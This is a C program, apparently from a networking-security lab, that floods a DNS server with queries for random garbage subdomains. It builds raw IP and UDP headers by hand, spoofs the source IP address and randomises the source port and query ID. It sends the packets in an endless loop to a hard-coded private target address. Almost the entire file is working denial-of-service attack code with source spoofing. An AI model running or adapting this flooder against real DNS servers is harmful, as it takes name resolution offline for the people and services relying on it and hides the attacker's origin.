#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <time.h>

typedef struct {
  uint16_t xid;      /* Randomly chosen identifier */
  uint16_t flags;    /* Bit-mask to indicate request/response */
  uint16_t qdcount;  /* Number of questions */
  uint16_t ancount;  /* Number of answers */
  uint16_t nscount;  /* Number of authority records */
  uint16_t arcount;  /* Number of additional records */
} dns_header_t;

typedef struct {
  char *name;        /* Pointer to the domain name in memory */
  uint16_t dnstype;  /* The QTYPE (1 = A) */
  uint16_t dnsclass; /* The QCLASS (1 = IN) */
} dns_question_t;

/*creates garbage domain name of format "abcde.abcde.abcde" , total 17 characters, the length 17 is hardcoded*/

void get_rand_str(char* str, int size){
    for(size_t i = 0; i < size; i++){
        str[i] = (char)(97 + rand()%26);
        if (i==4 || i==10)
        {
            str[++i] = '.';
        }
    }
}

int main(){

    srandom((unsigned long)time(NULL)); /* random seed */

    struct in_addr source_ip = {0}; /* source ip address which will be spoofed, initialized with all members as 0 */
    struct sockaddr_in dest_sock_addr = {0}; /* destination sock address, initialized with all members as 0 */

    u_short source_port = 0; /* source port number, will be re-assigned */
    u_short dest_port = 53; /* destination port, UDP port 53 for DNS queries */

    size_t sock; /* socket to write on */
    const int on = 1; /* sockopt param */
    size_t errno = 0; /* is set to error value when sendto() method fails */

    int random_ip = 1; /* flag to enable ip spoofing */

    unsigned char payload[2048] = {0}; /* payload for udp packet */

    struct ip* ip_header;
    struct udphdr* udp_header;
    uint8_t *packet;

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW); /* using raw socket, the user need to be Root user to use this socket. So it has to be run from terminal with root access */

    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on)); /* setting socket params */

    /* setting destination socket address, here the target DNS server */

    dest_sock_addr.sin_family = AF_INET;
    dest_sock_addr.sin_port = htons(dest_port);
    dest_sock_addr.sin_addr.s_addr = inet_addr("10.0.2.14");  /* target DNS server ip address */


    /*  Packet structure -> IP Header | UDP Header | DNS Header | DNS Question
        Here DNS Header and DNS Question is the payload
        The naming might seem a bit confusing -.-'
    */

    ip_header = (struct ip*)payload;
    udp_header = (struct udphdr*)((char *)ip_header + sizeof(struct ip));
    packet = (uint8_t *)((char*)udp_header + sizeof(struct udphdr));

    /* Set up the DNS header */

	dns_header_t header;
	memset (&header, 0, sizeof (dns_header_t));
	header.flags = htons(0x0100); /* Q=0, RD=1 */
	header.qdcount = htons(1);    /* Sending 1 question */

	/* Set up the DNS question */
	dns_question_t question;
	question.dnstype = htons(1);  /* QTYPE 1=A */
	question.dnsclass = htons(1); /* QCLASS 1=IN */


    /* Set up UDP header */

    udp_header->uh_dport = htons(dest_port);

    if(source_port){
        udp_header->uh_sport = htons(source_port);
    }

    /* Set IP header */

    ip_header->ip_dst.s_addr = dest_sock_addr.sin_addr.s_addr;
    ip_header->ip_v = IPVERSION;
    ip_header->ip_hl = sizeof(struct ip) >> 2;
    ip_header->ip_ttl = 245;
    ip_header->ip_p = IPPROTO_UDP;

    char* hostname = (char*)malloc(17); /* domain name as hostname, its size wont be changed later, but the contents will */

    // entering the infinite loop to continuously send packets

    while(1){

        get_rand_str(hostname, 17); /* setting hostname to a random garbage domain */

        /* DNS name format requires two bytes more than the length of the
           domain name as a string, check rfc-1035 documentation for details */

        question.name = calloc (strlen (hostname) + 2, sizeof (char));

        /* converting hostname string to DNS question fields*/

        memcpy (question.name + 1, hostname, strlen (hostname)); /* Leave the first byte blank for the first field length */

        uint8_t *prev = (uint8_t *) question.name; /* Used to keep track of the location of the byte where the current field’s length will be stored */
        uint8_t count = 0; /* Used to count the bytes in a field */

        /* Traverse through the name, looking for the . locations */
        for (size_t i = 0; i < strlen(hostname); i++)
          {
            /* A . indicates the end of a field */
            if (hostname[i] == '.')
              {
                /* Copy the length to the byte before this field, then
                   update prev to the location of the . */
                *prev = count;
                prev = question.name + i + 1;
                count = 0;
              }
            else
              count++;
          }

        *prev = count;

        uint8_t *p = (uint8_t *)packet;

        /* Copy the header first */

        memcpy (p, &header, sizeof (header));
        p += sizeof (header);

        /* Copy the question name, QTYPE, and QCLASS fields */

        memcpy (p, question.name, strlen (hostname) + 1);
        p += strlen (hostname) + 2; /* includes 0 octet for end */
        memcpy (p, &question.dnstype, sizeof (question.dnstype));
        p += sizeof (question.dnstype);
        memcpy (p, &question.dnsclass, sizeof (question.dnsclass));

        size_t packetlen = sizeof(header) + strlen(hostname) + 2 + sizeof(question.dnstype) + sizeof (question.dnsclass);

        size_t ip_data_len;
        size_t udp_data_len;

        ssize_t ret_val;

        if(random_ip){
            source_ip.s_addr = inet_addr("10.0.2.20"); /* spoofed ip address, keep the network address same as the LAN, so available IPs to use is 10.0.2.1-254 */
        }

        /* Randomly chosen ID for DNS header, max value 2^16-1 for 16 bit id */

        header.xid = htons(random() % 65535);

        udp_data_len = packetlen;
        ip_data_len = sizeof(struct udphdr) + udp_data_len;

        /* Update UDP header */

        if(!source_port){
            udp_header->uh_sport = htons(random() % 65535); /* spoofing source port number */
        }

        udp_header->uh_ulen = htons(sizeof(struct udphdr) + udp_data_len);
        udp_header->uh_sum = 0;

        /* Update IP header */

        ip_header->ip_src.s_addr = source_ip.s_addr;
        ip_header->ip_id = htons(random() % 65535);
        ip_header->ip_len = sizeof(struct ip) + ip_data_len;
        ip_header->ip_sum = 0;

        /* Send the UDP packet */

        ret_val = sendto(sock, (char *)ip_header, sizeof(struct ip) + ip_data_len, 0, (struct sockaddr *)&dest_sock_addr, sizeof(dest_sock_addr));

        if(ret_val == -1){
            printf("Failed\n");
            printf("Error sending packet: Error %d.\n", errno);
            perror("sendto Error");
        }

        free(question.name);

    }

    return 0;
}